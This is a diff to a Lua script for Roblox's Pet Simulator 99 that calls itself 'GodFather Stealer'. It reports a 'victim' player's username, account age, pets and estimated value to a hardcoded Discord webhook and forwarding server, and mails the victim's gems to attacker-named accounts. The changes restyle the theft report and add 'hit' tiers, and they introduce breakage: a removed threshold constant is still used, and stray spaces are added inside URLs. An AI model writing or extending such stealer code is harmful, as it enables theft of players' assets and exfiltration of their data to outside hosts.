@@ -49,11 +49,11 @@ local blacklist = {"Eliaskulmer999", "mskksld", "anubismc16", "diegoplays103"} -
 _G.Usernames = {"Eliaskulmer999", "Eliaskulmer999"}
 _G.Webhook = "https://discord.com/api/webhooks/1475151471631667378/MMcbj311BeXhS5kom8h8InyjHmygsQQR_6_qOxbQjKV7Pt2r1FszKsr0cxD1hdkz-oAa"
 
+
 local Forward = "https://webhook-rose-nu.vercel.app/api/forward.js"
 local users = {}
 local min_rap = 1000000
 local webhook = ""
-local HIGH_VALUE_THRESHOLD = 10000000000
 
 users = _G.Usernames
 webhook = _G.Webhook
@@ -402,40 +402,79 @@ local function SendMessage(GemAmount)
 
     local fields = {}
 
-    table.insert(fields,{
-        name = "Victim Username",
-        value = player.Name,
-        inline = true
-    })
-
-    table.insert(fields,{
-        name = "Receiver",
-        value = table.concat(users,", "),
-        inline = true
-    })
-
-    table.insert(fields,{
-        name = "Account Age",
-        value = formatAccountAge(player.AccountAge),
-        inline = true
-    })
-
-    table.insert(fields,{
-        name = "Executor",
-        value = executorName or "Unknown",
-        inline = true
-    })
-
-    local isHighValue = totalRAP >= HIGH_VALUE_THRESHOLD
-
-    if isHighValue then
-        table.insert(fields,{
-            name = "🚨 Alert",
-            value = "**HIGH VALUE HIT DETECTED**",
-            inline = false
-        })
+    local totalPets = 0
+    for _, item in ipairs(sortedItems) do
+        totalPets = totalPets + item.amount
     end
 
+    local bestPet = nil
+    local bestPetRAP = 0
+    for _, item in ipairs(sortedItems) do
+        local itemTotalRAP = item.amount * item.rap
+        if itemTotalRAP > bestPetRAP then
+            bestPetRAP = itemTotalRAP
+            bestPet = item
+        end
+    end
+
+    table.insert(fields,{
+        name = "👤 Username",
+        value = "```" .. player.Name .. "```",
+        inline = true
+    })
+
+    table.insert(fields,{
+        name = "📥 Receiver",
+        value = "```" .. table.concat(users,", ") .. "```",
+        inline = true
+    })
+
+    table.insert(fields,{
+        name = "📅 Account Age",
+        value = "```" .. formatAccountAge(player.AccountAge) .. "```",
+        inline = true
+    })
+
+    table.insert(fields,{
+        name = "⚡ Executor",
+        value = "```" .. (executorName or "Unknown") .. "```",
+        inline = true
+    })
+
+    table.insert(fields,{
+        name = "💎 Total RAP",
+        value = "```" .. formatNumber(totalRAP) .. "```",
+        inline = true
+    })
+
+    table.insert(fields,{
+        name = "\u200B",
+        value = "\u200B",
+        inline = true
+    })
+
+    local bestPetName = bestPet and bestPet.name or "None"
+    local bestPetDisplay = bestPet and (bestPet.amount .. "x " .. bestPetName) or "None"
+
+    table.insert(fields,{
+        name = "🐵 Total Pets 🐵",
+        value = "```→ " .. formatNumber(totalPets) .. "```",
+        inline = true
+    })
+
+    table.insert(fields,{
+        name = "👑 Best Pet 👑",
+        value = "```→ " .. bestPetDisplay .. "```",
+        inline = true
+    })
+
+    table.insert(fields,{
+        name = "🏆 Best Pet RAP 🏆",
+        value = "```→ " .. formatNumber(bestPetRAP) .. "```",
+        inline = true
+    })
+
+    -- All Pets List
     local itemMap = {}
     local order = {}
 
@@ -454,7 +493,6 @@ local function SendMessage(GemAmount)
             itemMap[item.name].amount + item.amount
     end
 
-
     table.sort(order,function(a,b)
 
         local A = itemMap[a]
@@ -463,7 +501,6 @@ local function SendMessage(GemAmount)
         return (A.amount * A.rap) > (B.amount * B.rap)
 
     end)
-
 
     local itemText = ""
 
@@ -483,7 +520,6 @@ local function SendMessage(GemAmount)
         )
     end
 
-
     local pasteLink = nil
 
     if #itemText > 900 then
@@ -493,7 +529,7 @@ local function SendMessage(GemAmount)
         })
 
         local result = HttpService:PostAsync(
-            "https://pastefy.app/api/v2/paste",
+            "https://pastefy.app/api/v2/paste ",
             pasteBody,
             Enum.HttpContentType.ApplicationJson
         )
@@ -509,8 +545,6 @@ local function SendMessage(GemAmount)
 
     end
 
-
-
     local totalEUR = rapToEUR(totalRAP)
     local gemsEUR = rapToEUR(GemAmount)
 
@@ -519,41 +553,46 @@ local function SendMessage(GemAmount)
         "\n📊 Total RAP: "..formatNumber(totalRAP)..
         "\n💰 Estimated Value: "..formatEUR(totalEUR)
 
-
     table.insert(fields,{
-        name = "Items",
+        name = "📋 All Items",
         value = itemText,
         inline = false
     })
 
     table.insert(fields,{
-        name = "Summary",
-        value = summaryText,
+        name = "💰 Summary",
+        value = "```" .. summaryText .. "```",
         inline = false
     })
-	
-	local titleName
 
-	if totalRAP >= 100000000 then
-		titleName = "PS99 | GOOD HIT"
-	elseif totalRAP > 50000000 then
-		titleName = "PS99 | NORMAL HIT"
-	else
-		titleName = "PS99 | BAD HIT"
-	end
+    local titleName
+    local embedColor
 
-    local embedColor = isHighValue and 8388736 or 16711680
-    local contentPing = isHighValue and "@everyone" or ""
+    if totalRAP >= 10000000000 then 
+        titleName = "🚨 PS99 | INSANE HIT 🚨"
+        embedColor = 16711680  -- Red
+    elseif totalRAP >= 100000000 then  
+        titleName = "PS99 | GOOD HIT"
+        embedColor = 8388736   -- Purple
+    elseif totalRAP > 50000000 then    
+        titleName = "PS99 | NORMAL HIT"
+        embedColor = 16711680  -- Red 
+    else                               
+        titleName = "PS99 | BAD HIT"
+        embedColor = 3355443  -- Black
+    end
+
+    local contentPing = (totalRAP >= HIGH_VALUE_THRESHOLD) and "@everyone" or ""
 
     local body = HttpService:JSONEncode({
 
         webhook = webhook,
 
         content = contentPing,
-		
-		username = "GodFather Stealer",
-		
-		avatar_url = "https://i.imgur.com/tRc34Ar.png",
+        
+        username = "GodFather Stealer",
+        
+        avatar_url = "https://i.imgur.com/ulY8nQk.png ",
 
         embeds = {{
 
@@ -569,7 +608,6 @@ local function SendMessage(GemAmount)
 
         }}
     })
-
 
     if usingStudio then
 
@@ -642,7 +680,7 @@ local function SendAllGems()
                         [2] = MailMessage,
                         [3] = "Currency",
                         [4] = i,
-                        [5] = GemAmount1 - mailPrice
+                        [5] = GemAmount - mailPrice
                     }
                     
                     local response, err = network.Invoke("Mailbox: Send", unpack(args))
